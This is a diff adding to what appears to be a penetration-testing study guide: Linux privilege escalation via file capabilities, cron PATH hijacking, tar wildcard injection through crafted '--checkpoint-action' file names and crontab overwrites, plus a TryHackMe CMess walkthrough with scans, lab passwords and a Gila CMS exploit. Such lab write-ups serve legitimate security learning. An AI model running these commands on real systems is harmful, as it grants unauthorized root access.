@@ -586,3 +586,221 @@ export -f /usr/sbin/service
 ![Privilege Escalation](./Image/38.png)
 
 By doing this, you can gain a shell with the SUID user's privileges.
+
+# Privilege Escalation via Capabilities
+
+To search for files with capabilities, use the following command:
+
+```bash
+getcap -r / 2> /dev/null
+```
+
+Look for files with the `+ep` flag:
+
+![Privilege Escalation](./Image/39.png)
+
+You can exploit such files by running this command:
+
+```bash
+/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
+![Privilege Escalation](./Image/40.png)
+
+# Privilege Escalation through Scheduled Tasks
+
+To view cron jobs, you can use the following command:
+
+```bash
+cat /etc/crontab
+```
+
+![Privilege Escalation](./Image/41.png)
+
+Additionally, you can list systemd timers using:
+
+```bash
+systemctl list-timers --all
+```
+
+## Escalation via Cron Path Manipulation
+
+In the output of `cat /etc/crontab`, you might notice a `PATH` variable where the first directory it searches is `/home/user`. If it doesn’t find the required script there, it moves on to the next directory:
+
+![Privilege Escalation](./Image/42.png)
+
+To exploit this, we can hijack a script, such as `overwrite.sh`, as follows:
+
+```bash
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+chmod +x /home/user/overwrite.sh
+```
+
+Once that’s done, you can execute the newly created `bash` file in the `/tmp` directory with the following command:
+
+```bash
+/tmp/bash -p
+```
+
+![Privilege Escalation](./Image/43.png)
+
+## Escalation via Cron Wildcards
+
+For this example, we will use `tar` as specified in the `/etc/crontab` file:
+
+![Privilege Escalation](./Image/44.png)
+
+To exploit this vulnerability, execute the following commands:
+
+```bash
+echo 'cp /bin/bash /tmp/bash3; chmod +s /tmp/bash3' > /home/user/runme.sh
+chmod +x /home/user/runme.sh
+touch '/home/user/--checkpoint=1'
+touch '/home/user/--checkpoint-action=exec=sh runme.sh'
+
+/tmp/bash3 -p
+```
+
+![Privilege Escalation](./Image/45.png)
+
+## Privilege Escalation via File Overwrite
+
+If we have permission to overwrite a crontab task, such as the one shown below:
+
+![Privilege Escalation](./Image/42.png)
+
+![Privilege Escalation](./Image/46.png)
+
+We can exploit this by using a similar method to the previous examples to gain root access. Here’s the command to modify the `overwrite.sh` script:
+
+```bash
+echo 'cp /bin/bash /tmp/bash4; chmod +s /tmp/bash4' >> /usr/local/bin/overwrite.sh
+```
+
+![Privilege Escalation](./Image/47.png)
+
+# Challenge #2: CMess Room
+
+**Link**: [TryHackMe CMess Room](https://tryhackme.com/r/room/cmess)
+
+### Initial Nmap Scan
+
+To begin, we performed an Nmap scan to identify open ports on the target machine.
+
+```bash
+nmap -T4 10.10.108.161
+```
+
+**Results**:
+
+```
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
+
+The scan revealed two open ports:
+- **Port 22**: SSH
+- **Port 80**: HTTP
+
+Next, we ran a more detailed scan to gather additional service information:
+
+```bash
+nmap -T4 -p 22,80 -A 10.10.108.161
+```
+
+**Detailed Scan Results**:
+
+```
+22/tcp open  ssh     OpenSSH 7.2p2 (Ubuntu)
+80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
+```
+
+- **Port 22**: OpenSSH 7.2p2 (Ubuntu)
+- **Port 80**: Apache 2.4.18 running on Ubuntu, with Gila CMS
+
+Additionally, the `/robots.txt` file revealed some disallowed directories:
+
+```bash
+Disallow: /src/
+Disallow: /themes/
+Disallow: /lib/
+```
+
+### Directory Busting with Wfuzz
+
+Next, we performed subdirectory enumeration using `wfuzz`:
+
+```bash
+wfuzz -c -f sub-fighter -w top5000.txt -u 'http://cmess.thm' -H "HOST: FUZZ.cmess.thm" --hw 290
+```
+
+We successfully discovered the subdomain `dev.cmess.thm`.
+
+![Subdomain Discovery](./Image/48.png)
+
+### Discovering a User Password
+
+Upon exploring `dev.cmess.thm`, we found a password for the user `andre`:
+
+![Password Found](./Image/49.png)
+
+```bash
+andre@cmess.thm:KPFTN_f2yxe%
+```
+
+### Identifying Gila CMS Version
+
+Once authenticated, we identified the version of Gila CMS:
+
+![Gila CMS Version](./Image/50.png)
+
+This led us to an exploit for this CMS:
+
+- **Exploit**: [Gila CMS Exploit (Exploit-DB)](https://www.exploit-db.com/exploits/51569)
+
+### Reverse Shell Exploit
+
+We executed the exploit and successfully gained a reverse shell:
+
+![Reverse Shell](./Image/51.png)
+
+![Reverse Shell Success](./Image/52.png)
+
+### Privilege Escalation
+
+Now operating as the `www-data` user, we needed to escalate our privileges. After running `linpeas.sh`, we discovered an interesting file containing a backup password for the `andre` user.
+
+![Backup Password Found](./Image/53.png)
+
+Using this password, we logged in as the `andre` user via SSH.
+
+![Login as Andre](./Image/54.png)
+
+```
+andre:UQfsdCB7aAP6
+```
+
+### Exploiting Cron Job
+
+While we couldn’t run `sudo`, we found a cron job in the `crontab` file. By crafting a script to exploit this cron job, we escalated our privileges to root.
+
+![Cron Job Discovery](./Image/56.png)
+
+### Gaining Root Access
+
+Here’s the command we used to gain root privileges:
+
+```bash
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/runme.sh
+chmod +x /home/andre/backup/runme.sh
+touch '/home/andre/backup/--checkpoint=1'
+touch '/home/andre/backup/--checkpoint-action=exec=sh runme.sh'
+```
+
+And finally, we became root:
+
+![Root Access](./Image/57.png)
+
+# Escalation path using NFS Root Squashing
+
